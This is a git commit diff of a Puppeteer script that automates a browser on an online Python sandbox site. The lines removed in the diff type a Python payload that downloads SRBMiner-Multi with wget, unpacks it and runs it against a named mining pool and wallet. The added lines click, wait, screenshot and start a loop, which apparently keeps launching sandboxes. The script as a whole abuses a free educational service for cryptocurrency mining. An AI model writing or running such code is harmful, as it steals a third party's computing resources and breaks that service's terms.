7ae377579083dd98924f14ce43f19732d15e6a78
gimbalgondring <102336629+gimbalgondring@users.noreply.github.com>
2022-04-23 08:06:42 +0700

    Update and rename w.js to b1.js

--- b1.js
+++ b1.js
@@ -8,15 +8,14 @@ const puppeteer = require('puppeteer');
     });
     const page = await browser.newPage();
     await page.setUserAgent(userAgent.toString())
-    await page.goto('https://codehs.com/sandbox/id/python-3-esyA5R')
+    await page.goto('https://codehs.com/sandbox/id/python-3-m6GXXr')
     await page.waitForTimeout(2000)
-    await page.mouse.click(350, 350, { 'button': 'left' })
-    await page.waitForTimeout(1000)
-    await page.keyboard.down('ControlLeft')
-    await page.keyboard.press('KeyA')
-    await page.keyboard.up('ControlLeft')
-    await page.keyboard.type(`import os;import time;os.system("wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz");time.sleep(3);os.system("tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz");time.sleep(3);os.system("cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool ap.luckpool.net:3956 --wallet RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.ROOT${i} --password x")`)
-    await page.waitForTimeout(5000)
+    await page.mouse.click(580,125,{'button': 'left'})
+    await page.waitForTimeout(15000)
+    await page.mouse.click(625,125,{'button': 'left'})
+    await page.waitForTimeout(500)
+    await page.screenshot({'path': 'stop.png'})
+    await page.waitForTimeout(1500)
     await page.mouse.click(580,125,{'button': 'left'})
     await page.waitForTimeout(1000)
     for(y=0;y<350;y++) {
